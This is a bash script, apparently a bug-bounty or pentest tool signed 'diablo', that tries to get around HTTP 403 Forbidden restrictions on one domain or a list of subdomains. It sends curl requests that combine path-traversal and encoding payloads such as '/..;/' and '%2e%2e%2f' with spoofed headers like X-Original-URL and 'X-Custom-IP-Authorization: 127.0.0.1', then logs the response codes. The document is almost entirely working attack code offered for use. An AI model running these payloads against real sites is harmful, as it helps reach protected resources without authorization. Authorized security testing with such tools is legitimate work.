#!/bin/bash

figlet 403-Bypass
echo "                                               𝕓𝕪:𝕕𝕚𝕒𝕓𝕝𝕠 

"

# Display usage information if no arguments or -h is provided
if [ $# -eq 0 ] || [ "$1" == "-h" ]; then
    echo "Usage: $0 [-d domain] [-l input_file] [-o output_file]"
    echo "input_file: A file containing one subdomain per line to test for 403 bypasses."
    echo "output_file: A file to save the output."
    echo "Options:"
    echo "-h : help"
    echo "-d : specify a single domain to test"
    echo "-l : specify an input file containing subdomains to test"
    echo "-o : specify an output file to save the results"
    exit 1
fi

# Check if -d option is provided
if [ "$1" == "-d" ]; then
    domain=$2
    shift 2
else
    domain=""
fi

# Check if -l option is provided
if [ "$1" == "-l" ]; then
    input_file=$2
    shift 2
else
    input_file=""
fi

# Check if -o option is provided and open file descriptor for output redirection
if [ "$1" == "-o" ]; then
    exec 3> >(tee $2)
else
    exec 3>&1
fi

# Define payloads
payloads=("/" "/*" "/%2f/" "/./" "./." "/*/" "?" "??" "&" "#" "%" "%20" "%09" "/..;/" "../" "..%2f" "..;/" ".././" "..%00/" "..%0d" "..%5c" "..%ff/" "%2e%2e%2f" ".%2e/" "%3f" "%26" "%23" ".json")

# Define headers
headers=("X-Original-URL" "X-Custom-IP-Authorization" "X-Forwarded-For" "X-rewrite-url" "X-Forwarded-Host" "X-Host" "X-Remote-IP" "X-Originating-IP")

test_domain() {
    url=$1

    # Test for known 403 bypasses
    echo "Testing: $url"
    for payload in "${payloads[@]}"; do
        for header in "${headers[@]}"; do
            # Send a GET request and print the URL being requested along with the status code
            request_url="$url$payload"
            status_code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header: $payload" "$request_url")
            #echo "Requested URL: $request_url"
            echo "Requested URL: $request_url and header $header: $status_code"
        done >&3
    done

    # Additional headers from your second script, printing the URL being requested along with the status code
    curl -s -o /dev/null -w "Requested URL: $url\nX-Custom-IP-Authorization: 127.0.0.1 - %{http_code}\n\n" -H "X-Custom-IP-Authorization: 127.0.0.1" --max-time 5 $url >&3
    
    # ... repeat for other headers ...

    echo "----------------------"
}

# Loop through the subdomains in the input file or single domain
for protocol in http https; do
    if [ -n "$domain" ]; then
        # If -d option is provided, only test the specified domain
        url="$protocol://$domain"
        test_domain "$url"
    elif [ -n "$input_file" ]; then
        # If -l option is provided, test each subdomain in the input file
        while read subdomain; do
            url="$protocol://$subdomain"
            test_domain "$url"
        done < "$input_file"
    fi
done

